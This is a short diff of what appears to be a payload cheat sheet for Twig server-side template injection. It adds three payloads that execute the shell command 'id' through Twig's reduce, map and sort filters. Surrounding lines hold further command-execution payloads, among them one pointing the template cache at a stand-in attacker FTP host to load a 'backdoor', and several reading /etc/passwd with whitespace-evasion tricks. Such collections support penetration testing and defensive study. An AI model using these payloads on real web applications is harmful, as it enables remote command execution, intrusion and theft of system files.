@@ -829,6 +829,9 @@ $output = $twig > render (
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
 ```
